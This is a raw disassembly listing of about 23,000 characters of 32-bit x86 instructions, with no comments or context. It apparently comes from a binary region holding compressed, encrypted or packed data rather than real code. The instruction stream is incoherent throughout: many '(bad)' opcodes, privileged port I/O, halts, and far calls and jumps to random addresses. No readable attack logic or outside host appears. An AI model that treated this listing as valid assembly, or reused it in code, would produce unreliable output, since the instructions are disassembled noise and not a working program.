  4063bd:	dec    esi
  4063be:	jl     0x40643d
  4063c0:	and    bl,BYTE PTR [edx]
  4063c2:	out    0xcd,al
  4063c4:	ret    
  4063c5:	push   ebx
  4063c6:	aam    0x93
  4063c8:	data16 mov WORD PTR [esi-0x1669f80c],gs
  4063cf:	cmp    DWORD PTR [ebp+0x61],0xeff84279
  4063d6:	sub    ecx,DWORD PTR [edi+0x13087d09]
  4063dc:	xor    eax,0x10e0dd23
  4063e1:	das    
  4063e2:	inc    ecx
  4063e3:	loope  0x40638f
  4063e5:	fs dec ecx
  4063e7:	mov    edx,0xe60ce191
  4063ec:	dec    ecx
  4063ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063ee:	rcr    DWORD PTR ss:[edx],0x69
  4063f2:	sbb    DWORD PTR [ebp-0x79],ecx
  4063f5:	xchg   edx,eax
  4063f6:	ror    dl,1
  4063f8:	jnp    0x406412
  4063fa:	out    dx,eax
  4063fb:	push   cs
  4063fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063fd:	mov    bl,0xb6
  4063ff:	sub    BYTE PTR [ebp-0x381347ba],ah
  406405:	mov    esp,0x907f821f
  40640a:	fiadd  WORD PTR [edx-0x21]
  40640d:	sub    DWORD PTR [ebx-0x289c967d],ecx
  406413:	inc    edx
  406414:	rol    ah,cl
  406416:	cmp    BYTE PTR [edi],ah
  406418:	push   edi
  406419:	sbb    ebp,DWORD PTR ds:0xcd8c77e3
  40641f:	add    esi,DWORD PTR [eax]
  406421:	jne    0x40644f
  406423:	retf   
  406424:	mov    DWORD PTR [esi-0x7ea25d69],0x34ed8884
  40642e:	and    al,0x67
  406430:	mov    al,0x8c
  406432:	aad    0x69
  406434:	add    ecx,DWORD PTR ds:[esi]
  406437:	sub    al,0x3d
  406439:	mov    dl,0x4a
  40643b:	xor    ecx,DWORD PTR ss:[esi-0x2978e600]
  406442:	mov    esi,0xd7f990b4
  406447:	imul   ebp,DWORD PTR [ecx-0x1f61af4],0x5d24815b
  406451:	cmp    al,0xf2
  406453:	xchg   ecx,eax
  406454:	push   0xffffffb0
  406456:	pop    ebx
  406457:	test   BYTE PTR [eax+0x735ce885],ah
  40645d:	in     eax,dx
  40645e:	ret    
  40645f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406460:	stc    
  406461:	mov    ebx,0x61916e31
  406466:	cdq    
  406467:	sti    
  406468:	jbe    0x40645b
  40646a:	fiadd  DWORD PTR [ebx+0x10]
  40646d:	xchg   ebp,eax
  40646e:	in     eax,0x39
  406470:	or     eax,0x6c37185b
  406475:	xchg   ebp,eax
  406476:	jns    0x406436
  406478:	adc    ch,ah
  40647a:	shl    BYTE PTR [esi+0x15],1
  40647d:	cmp    eax,0x4eb3f8e5
  406482:	sbb    BYTE PTR [esi],dh
  406484:	ret    
  406485:	sbb    al,0xba
  406487:	test   dh,cl
  406489:	aaa    
  40648a:	jge    0x406474
  40648c:	pop    esp
  40648d:	cmp    DWORD PTR [edi+0x59],ebp
  406490:	mov    ebx,0xd96a0c08
  406495:	mov    eax,ds:0x45add3c4
  40649a:	stos   BYTE PTR es:[di],al
  40649c:	add    ebx,DWORD PTR [ecx]
  40649e:	ret    0x81a0
  4064a1:	push   ds
  4064a2:	jbe    0x406469
  4064a4:	dec    ebp
  4064a5:	jp     0x406504
  4064a7:	fst    QWORD PTR [ecx]
  4064a9:	nop
  4064aa:	sub    eax,0x5962416a
  4064af:	sbb    al,0x5f
  4064b1:	inc    ebx
  4064b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064b3:	out    dx,al
  4064b4:	pop    ss
  4064b5:	cwde   
  4064b6:	adc    eax,0x5c799c76
  4064bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064bc:	pop    ds
  4064bd:	or     esi,eax
  4064bf:	(bad)  
  4064c0:	daa    
  4064c1:	sub    BYTE PTR [ebx+0x2a],dh
  4064c4:	inc    ebx
  4064c5:	repnz clc 
  4064c7:	ins    DWORD PTR es:[edi],dx
  4064c8:	mov    ah,0xc5
  4064ca:	push   edi
  4064cb:	cmp    cl,BYTE PTR [esp+edi*8]
  4064ce:	stos   DWORD PTR es:[edi],eax
  4064cf:	hlt    
  4064d0:	xchg   BYTE PTR [esi],bl
  4064d2:	xor    dh,BYTE PTR [ebp+ebx*4+0x382d1072]
  4064d9:	daa    
  4064da:	int    0x84
  4064dc:	repz ficom WORD PTR [eax-0x5bb63e80]
  4064e3:	repz imul ebp,DWORD PTR [ebx+edx*1-0x5dae7154],0x4adcc753
  4064ef:	cmp    DWORD PTR [esi+0x78],edx
  4064f2:	add    eax,DWORD PTR [edx+0x4cfd6c2c]
  4064f8:	sub    esi,DWORD PTR [edi]
  4064fa:	sbb    DWORD PTR [edx],edx
  4064fc:	cvtps2pd xmm4,QWORD PTR [ebx+0x24]
  406500:	mov    cl,BYTE PTR [esp+ebx*4]
  406503:	xchg   BYTE PTR [edx-0x4e],ah
  406506:	cdq    
  406507:	mov    ebp,0x270f05d0
  40650c:	call   0x43034820
  406511:	ins    BYTE PTR es:[edi],dx
  406512:	mov    eax,ds:0xc0ada6ed
  406517:	and    bh,BYTE PTR [ebx-0x5d]
  40651a:	jae    0x406507
  40651c:	inc    ecx
  40651d:	shl    DWORD PTR [esi+0x2d],cl
  406520:	push   esi
  406521:	jb     0x4064be
  406523:	fldcw  WORD PTR [esi+0x1fdfcf95]
  406529:	mov    dl,0x1e
  40652b:	mov    esp,0x21c2bb85
  406530:	hlt    
  406531:	jp     0x40658f
  406533:	loope  0x4064c6
  406535:	repnz enter 0xb06f,0xb4
  40653a:	arpl   WORD PTR [eax],dx
  40653c:	mov    al,ds:0x489299f0
  406541:	sbb    BYTE PTR [ebp+ebp*1+0x13e85227],cl
  406548:	(bad)  
  406549:	cmp    DWORD PTR [ebp-0x6f],ecx
  40654c:	pop    ds
  40654d:	shl    al,1
  40654f:	adc    eax,0x2d97eef8
  406554:	int3   
  406555:	xchg   BYTE PTR [ecx-0x3b],al
  406558:	mov    edx,0xdc158e34
  40655d:	xchg   ecx,eax
  40655e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40655f:	and    BYTE PTR [ecx-0x401ca65a],bh
  406565:	jmp    0xbe332c12
  40656a:	es push cs
  40656c:	fidivr WORD PTR [ebx+0x73]
  40656f:	add    ebp,eax
  406571:	scas   eax,DWORD PTR es:[edi]
  406572:	inc    esi
  406573:	adc    al,0xc1
  406575:	push   ebx
  406576:	add    cl,BYTE PTR [ecx+0x39e18bc2]
  40657c:	lds    esi,FWORD PTR [edx+0x4e]
  40657f:	dec    ecx
  406580:	fwait
  406581:	xchg   BYTE PTR [edx-0x49],ah
  406584:	mov    edx,0xbc59114e
  406589:	add    DWORD PTR [eax+edi*8-0x27],edx
  40658d:	mov    ?,WORD PTR [eax+esi*4-0x78b472e9]
  406594:	adc    cl,dh
  406596:	push   0x1b
  406598:	jo     0x40655f
  40659a:	mov    ds:0xeb0eaa97,al
  40659f:	cdq    
  4065a0:	pop    edx
  4065a1:	jb     0x4065ab
  4065a3:	xadd   DWORD PTR [ecx],ecx
  4065a6:	shufps xmm6,XMMWORD PTR [ebx],0x69
  4065aa:	nop
  4065ab:	cs icebp 
  4065ad:	sbb    ebx,edi
  4065af:	iret   
  4065b0:	push   0x1ee4d0c3
  4065b5:	cmp    DWORD PTR [eax-0x9],ecx
  4065b8:	stos   DWORD PTR es:[edi],eax
  4065b9:	cld    
  4065ba:	div    edi
  4065bc:	shr    BYTE PTR [ebp+0x6d14247b],cl
  4065c2:	sub    esp,DWORD PTR [ebx-0x3d1f6b14]
  4065c8:	mov    ebp,0x18328031
  4065cd:	out    dx,al
  4065ce:	xor    eax,0xfd606757
  4065d3:	popf   
  4065d4:	dec    edi
  4065d5:	add    DWORD PTR [ebp-0x12],edx
  4065d8:	popf   
  4065d9:	push   esi
  4065da:	das    
  4065db:	xor    dh,ah
  4065dd:	in     eax,dx
  4065de:	push   0x2d
  4065e0:	(bad)  
  4065e1:	stos   DWORD PTR es:[edi],eax
  4065e2:	(bad)  
  4065e4:	pop    edi
  4065e5:	lock xor al,0x8f
  4065e8:	popa   
  4065e9:	xor    BYTE PTR [ecx],0x9e
  4065ec:	pop    ss
  4065ed:	shr    BYTE PTR cs:[edi-0x7c],0x5a
  4065f2:	mov    ecx,0xbd97d552
  4065f7:	and    al,0xff
  4065f9:	jl     0x4065e9
  4065fb:	mov    cl,BYTE PTR [ecx]
  4065fd:	jo     0x406588
  4065ff:	xchg   ebx,eax
  406600:	push   cs
  406601:	mov    dh,0x15
  406603:	mov    ebp,0x451188c4
  406608:	cmp    edi,DWORD PTR cs:[eax+0x45]
  40660c:	bound  ebx,QWORD PTR [ebx]
  40660e:	jbe    0x4065a7
  406610:	pop    ebx
  406611:	mov    eax,0xc089b020
  406616:	cmp    eax,0xc01c6920
  40661b:	mov    bh,0xa0
  40661d:	pop    ebx
  40661e:	push   ebx
  40661f:	mov    al,ah
  406621:	ret    
  406622:	cmp    BYTE PTR [ebx-0x71300e40],al
  406628:	out    dx,eax
  406629:	push   ebx
  40662a:	mov    ecx,0xd73c0147
  40662f:	dec    esp
  406630:	mov    dh,0x3b
  406632:	pop    edi
  406633:	xor    al,0xd0
  406635:	jg     0x4066b5
  406637:	inc    ebp
  406638:	lahf   
  406639:	sub    esp,DWORD PTR [eax]
  40663b:	fst    DWORD PTR [eax+0x8382961]
  406641:	xchg   cl,al
  406643:	fidiv  WORD PTR [ebp+0x4d]
  406646:	or     ah,BYTE PTR [ecx-0x24]
  406649:	mov    esi,DWORD PTR [edx]
  40664b:	mov    esi,0x3589d4d
  406650:	push   eax
  406651:	push   ecx
  406652:	sahf   
  406653:	jb     0x4066d2
  406655:	call   0x5b54:0x96d6e35d
  40665c:	push   0x47edeaec
  406661:	shr    cl,cl
  406663:	(bad)  
  406665:	mov    DWORD PTR [esi],edx
  406667:	pop    es
  406668:	ror    dl,0x58
  40666b:	pop    es
  40666c:	pusha  
  40666d:	pop    esp
  40666e:	xor    dl,al
  406670:	ret    
  406671:	xlat   BYTE PTR ds:[ebx]
  406672:	cmp    dh,BYTE PTR [ebp+0x390d6d06]
  406678:	adc    edi,DWORD PTR [ecx+0x66fd2fc3]
  40667e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40667f:	cld    
  406680:	mov    WORD PTR [edx+0x7],gs
  406683:	sub    eax,0xa748707a
  406688:	add    edx,ecx
  40668a:	jo     0x406694
  40668c:	pop    esp
  40668d:	pop    ecx
  40668e:	add    BYTE PTR [ecx+0x57],0xf5
  406692:	ins    BYTE PTR es:[di],dx
  406694:	mov    al,ch
  406696:	popa   
  406697:	push   ecx
  406698:	and    dh,BYTE PTR [eax-0x7c]
  40669b:	ffree  st(2)
  40669d:	and    bh,BYTE PTR ds:0x4c290356
  4066a3:	lahf   
  4066a4:	push   ds
  4066a5:	in     eax,dx
  4066a6:	das    
  4066a7:	sub    dh,ch
  4066a9:	test   BYTE PTR [edi-0x34241ac3],cl
  4066af:	enter  0xefb8,0xf7
  4066b3:	mov    ds:0xd413106b,al
  4066b8:	aad    0x4
  4066ba:	jge    0x406683
  4066bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066bd:	mov    ds:0xfc55f3a9,eax
  4066c2:	loope  0x4066d4
  4066c4:	retf   0x3a7f
  4066c7:	je     0x4066c2
  4066c9:	and    bl,0xbd
  4066cc:	sub    eax,0x47eca7c9
  4066d1:	test   DWORD PTR [esi+0x107588f9],edx
  4066d7:	lods   eax,DWORD PTR ds:[esi]
  4066d8:	enter  0xbc45,0x21
  4066dc:	int3   
  4066dd:	jnp    0x406684
  4066df:	aad    0x67
  4066e1:	repnz test BYTE PTR gs:[ecx-0x363ef22a],0x48
  4066ea:	arpl   WORD PTR [ecx-0x7d],bx
  4066ed:	xchg   edi,eax
  4066ee:	cmp    esp,esi
  4066f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066f1:	xor    eax,0x218c7882
  4066f6:	pop    eax
  4066f7:	test   DWORD PTR [ecx-0x2c],eax
  4066fa:	nop
  4066fb:	sub    cl,BYTE PTR [ecx-0x1bace83e]
  406701:	sub    BYTE PTR [eax],bh
  406703:	jnp    0x4066db
  406705:	inc    ebx
  406706:	das    
  406707:	mov    edx,0x25d5512a
  40670c:	cmp    DWORD PTR [esi+0x43],ebp
  40670f:	pop    cx
  406711:	mov    al,ds:0xd74127c7
  406716:	(bad)  
  406717:	into   
  406718:	scas   al,BYTE PTR es:[edi]
  406719:	stc    
  40671a:	sub    dh,BYTE PTR [edi-0x50a0b9bd]
  406720:	push   0x7f
  406722:	xchg   ebp,eax
  406723:	imul   ebp,DWORD PTR [eax+ebx*8+0x4abdc35a],0x74
  40672b:	mov    bl,0x52
  40672d:	aaa    
  40672e:	aam    0x46
  406730:	cli    
  406731:	dec    eax
  406732:	cmp    ah,al
  406734:	jnp    0x406793
  406736:	and    al,ch
  406738:	(bad)  
  406739:	jb     0x406713
  40673b:	push   esi
  40673c:	pushf  
  40673d:	adc    BYTE PTR [esp+ecx*8+0x52d4fe91],ah
  406744:	and    DWORD PTR [esi+0x51],eax
  406747:	push   0x2c
  406749:	sub    ebx,DWORD PTR [ecx]
  40674b:	das    
  40674c:	aad    0x6a
  40674e:	add    DWORD PTR [edx+0x23],esp
  406751:	cmp    BYTE PTR ds:[edi-0x6c74c145],dl
  406758:	addr16 mov al,0x6f
  40675b:	adc    DWORD PTR [esi],edi
  40675d:	cdq    
  40675e:	mov    al,0xc4
  406760:	mov    ecx,0x4f10c108
  406765:	cmp    al,0x20
  406767:	rcr    DWORD PTR [ebx],0x65
  40676a:	cli    
  40676b:	sub    bl,BYTE PTR [eax-0x5e]
  40676e:	test   al,0x25
  406770:	mov    edi,0xe0668de5
  406775:	gs jecxz 0x40670e
  406778:	int    0xb7
  40677a:	cmp    al,0xc6
  40677c:	ja     0x40672e
  40677e:	mov    bl,0x4f
  406780:	ficom  WORD PTR [edx-0x5f]
  406783:	and    eax,0x5e331d2d
  406788:	shl    BYTE PTR [edx],1
  40678a:	cmp    BYTE PTR [edi-0x36910489],dh
  406790:	sbb    al,0x6
  406792:	dec    ebp
  406793:	inc    edx
  406794:	xor    eax,0x57aca4c6
  406799:	in     eax,0x2b
  40679b:	rcr    edx,cl
  40679d:	loope  0x4067a4
  40679f:	mov    eax,0x41387c7a
  4067a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067a5:	jmp    0x40678f
  4067a7:	jb     0x4067ec
  4067a9:	and    ecx,DWORD PTR [ebx-0x47]
  4067ac:	jle    0x406755
  4067ae:	call   0x1b2836d1
  4067b3:	sbb    esi,DWORD PTR [ebx-0xc]
  4067b6:	(bad)  [eax*2-0x29d72512]
  4067bd:	imul   ebx,DWORD PTR [eax+0x69c1991e],0x870f41e
  4067c7:	pop    ecx
  4067c8:	pop    esp
  4067c9:	and    ah,0xe8
  4067cc:	cli    
  4067cd:	add    DWORD PTR ds:0x3568cf9c,edi
  4067d3:	(bad)  
  4067d4:	fild   QWORD PTR [ecx+0x2]
  4067d7:	sbb    ebp,DWORD PTR [esi-0x22]
  4067da:	lods   al,BYTE PTR ds:[esi]
  4067db:	sbb    ecx,DWORD PTR [ebp-0x59]
  4067de:	aas    
  4067df:	mov    dl,0xec
  4067e1:	in     al,dx
  4067e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067e3:	push   ecx
  4067e4:	fldenv [edx+0x44]
  4067e7:	outs   dx,DWORD PTR ds:[esi]
  4067e8:	lods   eax,DWORD PTR ds:[esi]
  4067e9:	pop    esp
  4067ea:	dec    ebp
  4067eb:	add    al,0x9d
  4067ed:	xor    dh,0x9b
  4067f0:	mov    bh,0x37
  4067f2:	push   ss
  4067f3:	push   edx
  4067f4:	mov    cl,0x47
  4067f6:	(bad)  
  4067f7:	push   0xffffffc5
  4067f9:	leave  
  4067fa:	mov    ebx,0xe96a6550
  4067ff:	(bad)  
  406800:	dec    esp
  406801:	xlat   BYTE PTR ds:[ebx]
  406802:	lahf   
  406803:	lods   eax,DWORD PTR ds:[esi]
  406804:	inc    eax
  406805:	call   0x30afb46e
  40680a:	outs   dx,DWORD PTR ds:[esi]
  40680b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40680c:	cli    
  40680d:	push   0x63a17f89
  406812:	retf   
  406813:	add    edi,ebx
  406815:	in     eax,0x81
  406817:	shl    BYTE PTR [edx+edi*4],0xd1
  40681b:	dec    esp
  40681c:	or     DWORD PTR [eax-0x2c],ebx
  40681f:	into   
  406820:	jae    0x4067c6
  406822:	adc    ch,BYTE PTR [edx-0x12ca0980]
  406828:	loopne 0x4067db
  40682a:	shr    BYTE PTR [edi+ebp*4],0xa3
  40682e:	rcr    BYTE PTR [eax+eax*1-0x5c4cf728],0x21
  406836:	sti    
  406837:	sub    dl,ch
  406839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40683a:	jmp    0x6c14:0x6a7ebf38
  406841:	push   esp
  406842:	push   0xfffffffa
  406844:	jno    0x40684c
  406846:	lds    esp,FWORD PTR [ebp+0x43]
  406849:	cmp    al,0x87
  40684b:	imul   eax,DWORD PTR [edx+0x71fe5a2e],0x90e7c05c
  406855:	loope  0x406815
  406857:	fcomp  st(5)
  406859:	pop    ds
  40685a:	into   
  40685b:	cmp    edi,esi
  40685d:	xchg   ebx,eax
  40685e:	inc    ebp
  40685f:	icebp  
  406860:	mov    gs,WORD PTR [edi+0x32]
  406863:	pushf  
  406864:	imul   ecx,eax,0xfffffff3
  406867:	sub    al,0xe8
  406869:	mov    ebp,0x6ac66fca
  40686e:	adc    ch,BYTE PTR [ebp+eax*4-0x2e9bd30e]
  406875:	call   0x86d460c
  40687a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40687b:	pop    es
  40687c:	fist   DWORD PTR [ecx+0x227f782e]
  406882:	out    0xe9,al
  406884:	jae    0x4068c4
  406886:	dec    eax
  406887:	xchg   edx,eax
  406888:	add    bl,ch
  40688a:	fidiv  DWORD PTR [ecx+0x7]
  40688d:	sahf   
  40688e:	and    al,0x55
  406890:	enter  0x4deb,0xf9
  406894:	push   0x13c8fb8a
  406899:	icebp  
  40689a:	mov    eax,ds:0xe37e7cda
  40689f:	mov    ah,0x37
  4068a1:	jle    0x406839
  4068a3:	sub    DWORD PTR [esi+ebx*8-0x10],ebp
  4068a7:	cwde   
  4068a8:	out    0xc0,al
  4068aa:	sar    DWORD PTR [eax+0x19],1
  4068ad:	out    dx,al
  4068ae:	jmp    0x40684d
  4068b0:	outs   dx,BYTE PTR ds:[esi]
  4068b1:	stc    
  4068b2:	sahf   
  4068b3:	fs jnp 0x40689f
  4068b6:	out    0x34,eax
  4068b8:	shr    DWORD PTR [edi],0x15
  4068bb:	mov    ds:0x5bd59cc6,al
  4068c0:	mov    ebx,0x4687cb2f
  4068c5:	push   esi
  4068c6:	mov    eax,0x9ddb3154
  4068cb:	in     eax,0x75
  4068cd:	mov    eax,0xc17bf076
  4068d2:	call   0x6b01:0xa29f8c8e
  4068d9:	lods   al,BYTE PTR ds:[esi]
  4068da:	lahf   
  4068db:	scas   eax,DWORD PTR es:[edi]
  4068dc:	pop    edi
  4068dd:	ja     0x4068a3
  4068df:	adc    dh,BYTE PTR [esi+0x11]
  4068e2:	inc    ecx
  4068e3:	sbb    al,0x96
  4068e5:	fstp   DWORD PTR [ebx]
  4068e7:	nop
  4068e8:	xchg   esi,eax
  4068e9:	xor    esp,DWORD PTR [ebx-0x7be25812]
  4068ef:	nop
  4068f0:	and    ch,0xf0
  4068f3:	xlat   BYTE PTR ds:[ebx]
  4068f4:	iret   
  4068f5:	dec    ecx
  4068f6:	mov    eax,0xbc599deb
  4068fb:	push   ds
  4068fc:	inc    esi
  4068fd:	xchg   esp,eax
  4068fe:	es out 0xf2,al
  406901:	addr16 mov ah,0x99
  406904:	push   ss
  406905:	cmc    
  406906:	push   eax
  406907:	mov    ch,0xd2
  406909:	or     BYTE PTR [edi],bh
  40690b:	add    eax,ebx
  40690d:	leave  
  40690e:	dec    edi
  40690f:	inc    edi
  406910:	jns    0x4068b4
  406912:	dec    edx
  406913:	lea    ecx,[ecx]
  406915:	mov    ebp,0xe2ad61c1
  40691a:	imul   edi,DWORD PTR [ebp-0xfd0986b],0xb672111d
  406924:	sub    DWORD PTR [ebx+0x70],esi
  406927:	ins    DWORD PTR es:[edi],dx
  406928:	and    eax,0xea2c76a8
  40692d:	mov    ebp,0x1553c80c
  406932:	mov    esi,0x8a28c02f
  406937:	sbb    DWORD PTR [edi],edi
  406939:	mov    bl,0xf0
  40693b:	add    eax,0xa2b7a62f
  406940:	cmp    eax,0x187cd22b
  406945:	xchg   DWORD PTR [eax+0x4855f46e],esp
  40694b:	push   cs
  40694c:	cmp    edx,0x280e0f94
  406952:	je     0x406977
  406954:	dec    esi
  406955:	test   eax,0x9a35f801
  40695a:	mov    edi,0x2fc4b2d1
  40695f:	repz jae 0x406980
  406962:	std    
  406963:	pop    ebx
  406964:	(bad)  
  406965:	fwait
  406966:	inc    edx
  406967:	stc    
  406968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406969:	sub    eax,0x9d19e37
  40696e:	inc    edx
  40696f:	push   0xdf9fb2a9
  406974:	push   esp
  406975:	mov    ebp,0xb8a7bccc
  40697a:	in     eax,dx
  40697b:	ins    BYTE PTR es:[edi],dx
  40697c:	fstp   TBYTE PTR [esi]
  40697e:	xor    bl,BYTE PTR [edx]
  406980:	dec    eax
  406981:	mov    esi,0x4638b729
  406986:	loopne 0x4069bb
  406988:	femms  
  40698a:	rcl    DWORD PTR [ecx],1
  40698c:	xor    DWORD PTR [ebx+0x54],ecx
  40698f:	lods   eax,DWORD PTR ds:[esi]
  406990:	stc    
  406991:	fs cmp eax,0xe7abf544
  406997:	fadd   QWORD PTR [ecx]
  406999:	(bad)  
  40699a:	iret   
  40699b:	mov    esi,0x6e89d766
  4069a0:	push   esp
  4069a1:	jns    0x406a14
  4069a3:	aad    0x74
  4069a5:	xor    edi,DWORD PTR [edi+0xb5a2783]
  4069ab:	and    eax,0x87fadcb2
  4069b0:	ret    0xa263
  4069b3:	mov    eax,ds:0x8c2ee532
  4069b8:	sub    al,al
  4069ba:	sbb    al,BYTE PTR [esi+0x33372dbd]
  4069c0:	pop    es
  4069c1:	test   eax,0xbc7cec3a
  4069c6:	xchg   esp,eax
  4069c7:	adc    BYTE PTR [ebp+0x0],cl
  4069ca:	jp     0x406a02
  4069cc:	iret   
  4069cd:	mov    BYTE PTR [edi+0x6d],cl
  4069d0:	int    0x2f
  4069d2:	in     al,dx
  4069d3:	cld    
  4069d4:	test   edi,ebp
  4069d6:	mov    al,0xcc
  4069d8:	lods   al,BYTE PTR ds:[esi]
  4069d9:	jecxz  0x4069f3
  4069db:	push   eax
  4069dc:	adc    al,0x6e
  4069de:	pop    ebx
  4069df:	mov    al,ds:0x967e860f
  4069e4:	fsubp  st(3),st
  4069e6:	dec    ecx
  4069e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069e8:	or     al,0x13
  4069ea:	xchg   esp,eax
  4069eb:	sub    DWORD PTR [ebx],esp
  4069ed:	mov    ds,WORD PTR [esi-0x7e]
  4069f0:	add    BYTE PTR [ecx-0x2b1152b6],dl
  4069f6:	dec    ecx
  4069f7:	out    0xa,eax
  4069f9:	inc    DWORD PTR [esi-0x5d85332e]
  4069ff:	fild   QWORD PTR [ebp+edi*2+0x3b3738ba]
  406a06:	adc    BYTE PTR [ecx+0x3ec011f9],ch
  406a0c:	popa   
  406a0d:	sbb    ebp,DWORD PTR [esi]
  406a0f:	popf   
  406a10:	mov    eax,0xef5e6549
  406a15:	push   0xda4088b1
  406a1a:	xchg   esi,eax
  406a1b:	iret   
  406a1c:	icebp  
  406a1d:	imul   ebx,DWORD PTR [edi],0xbe8f2d85
  406a23:	push   ss
  406a24:	popf   
  406a25:	sub    al,0x4b
  406a27:	lds    ebp,FWORD PTR [ebp+0x1]
  406a2a:	test   eax,0xf623e110
  406a2f:	and    dl,cl
  406a31:	and    dh,cl
  406a33:	adc    al,0xe6
  406a35:	and    DWORD PTR [edx],ebx
  406a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a38:	clc    
  406a39:	jo     0x406a06
  406a3b:	sar    DWORD PTR [ecx-0x3a],0x19
  406a3f:	pop    ebp
  406a40:	or     al,0x7d
  406a42:	cmp    DWORD PTR [ebx+0x76],esi
  406a45:	sbb    edx,DWORD PTR [eax-0x3a9a9eaf]
  406a4b:	repz mov eax,ds:0xcd38400d
  406a51:	stos   DWORD PTR es:[edi],eax
  406a52:	cmp    ebx,DWORD PTR [ecx-0x3ed89062]
  406a58:	sahf   
  406a59:	in     eax,0xfd
  406a5b:	(bad)  
  406a5d:	mov    eax,ds:0xc5032ad9
  406a62:	xor    BYTE PTR [edx-0x3b],0xda
  406a66:	sub    al,0x36
  406a68:	or     eax,0xab957f2f
  406a6d:	ss add esp,edi
  406a70:	mov    bl,al
  406a72:	inc    esp
  406a73:	push   ecx
  406a74:	sub    eax,0xd781158d
  406a79:	mov    BYTE PTR [ebx-0x6750d755],0x36
  406a80:	push   ds
  406a81:	fstp   TBYTE PTR [eax]
  406a83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a84:	xchg   esp,eax
  406a85:	mov    ds:0x39a27945,eax
  406a8a:	inc    esp
  406a8b:	sbb    BYTE PTR [ecx-0x6d],al
  406a8e:	mov    ebp,0xcb9bf3ef
  406a93:	lock pusha 
  406a95:	ss repnz pusha 
  406a98:	xchg   esi,eax
  406a99:	repz lahf 
  406a9b:	icebp  
  406a9c:	push   esi
  406a9d:	mov    ah,0x19
  406a9f:	xchg   ebp,eax
  406aa0:	mov    bh,BYTE PTR [ebx]
  406aa2:	push   0x7a
  406aa4:	push   es
  406aa5:	inc    eax
  406aa6:	push   esp
  406aa7:	cmp    al,0x3d
  406aa9:	je     0x406a72
  406aab:	mov    bh,0x94
  406aad:	hlt    
  406aae:	fwait
  406aaf:	lea    ecx,[esp+edx*2-0x62ce9228]
  406ab6:	mov    ah,0xfd
  406ab8:	and    bl,BYTE PTR [edi+0x39]
  406abb:	addr16 in eax,dx
  406abd:	call   0xb155a8d7
  406ac2:	sub    al,0x40
  406ac4:	mov    esp,0x256f1033
  406ac9:	dec    esi
  406aca:	ret    
  406acb:	xor    edi,edx
  406acd:	sub    al,0xd3
  406acf:	loop   0x406af0
  406ad1:	sbb    al,al
  406ad3:	cli    
  406ad4:	loope  0x406a7c
  406ad6:	xor    bh,bl
  406ad8:	xor    dl,bh
  406ada:	jbe    0x406a81
  406adc:	out    dx,eax
  406add:	jns    0x406b3c
  406adf:	out    0x4a,eax
  406ae1:	push   ecx
  406ae2:	lds    esi,FWORD PTR [edi+0x148db7d4]
  406ae8:	mov    esi,0x268db429
  406aed:	mov    esp,0xfaa7cd3f
  406af2:	or     al,0xbf
  406af4:	inc    ecx
  406af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406af6:	jno    0x406b00
  406af8:	mov    dl,0xe9
  406afa:	cmp    ebp,DWORD PTR [eax+0x8]
  406afd:	inc    esi
  406afe:	in     al,0xab
  406b00:	mov    edi,0xf4ec0be6
  406b05:	xor    al,0x55
  406b07:	sahf   
  406b08:	adc    ch,BYTE PTR [edx-0x7e]
  406b0b:	fdivrp st(0),st
  406b0d:	test   DWORD PTR [ecx-0x5e],ebp
  406b10:	enter  0x2efe,0x10
  406b14:	je     0x406aeb
  406b16:	or     dl,BYTE PTR [eax-0x71]
  406b19:	adc    ah,cl
  406b1b:	xor    cl,BYTE PTR [edi]
  406b1d:	push   ss
  406b1e:	(bad)  
  406b1f:	push   ebp
  406b20:	or     al,BYTE PTR [esi+0x2e]
  406b23:	or     ebp,ebx
  406b25:	jmp    0x8483:0xa2b2242
  406b2c:	repnz adc ebp,DWORD PTR [edx-0x740d34]
  406b33:	dec    esp
  406b34:	arpl   bx,ax
  406b36:	outs   dx,DWORD PTR ds:[esi]
  406b37:	ss out 0xf,al
  406b3a:	js     0x406b75
  406b3c:	jmp    0x406af7
  406b3e:	or     eax,0x79fd7196
  406b43:	dec    edx
  406b44:	jl     0x406b08
  406b46:	mov    esp,0x447bb6d8
  406b4b:	retf   0x9f6d
  406b4e:	or     DWORD PTR [eax+eax*1+0x25],edx
  406b52:	push   es
  406b53:	sbb    BYTE PTR [esi],dl
  406b55:	jg     0x406ae1
  406b57:	jns    0x406b7d
  406b59:	ret    0x450d
  406b5c:	inc    edi
  406b5e:	loop   0x406b49
  406b60:	pop    esp
  406b61:	xchg   edi,eax
  406b62:	das    
  406b63:	cmp    ecx,DWORD PTR [ebp-0x4696c9cb]
  406b69:	and    ebx,DWORD PTR [ecx-0x2e0a8dee]
  406b6f:	bound  ebx,QWORD PTR [edx]
  406b71:	dec    esp
  406b72:	call   0x4948:0xcc92043d
  406b79:	ja     0x406b39
  406b7b:	shr    DWORD PTR [ebx-0x75ad8e74],1
  406b81:	call   0xb57e:0xba5d3952
  406b88:	mov    edx,0x914b6635
  406b8d:	add    DWORD PTR [edi],edi
  406b8f:	or     esi,ebx
  406b91:	push   esi
  406b92:	xchg   DWORD PTR [edi],ebp
  406b94:	iret   
  406b95:	scas   al,BYTE PTR es:[edi]
  406b96:	xchg   edi,eax
  406b97:	push   ebx
  406b98:	lea    esi,[edx+0x2471ff67]
  406b9e:	fdiv   DWORD PTR [ebx+0x3d2c6759]
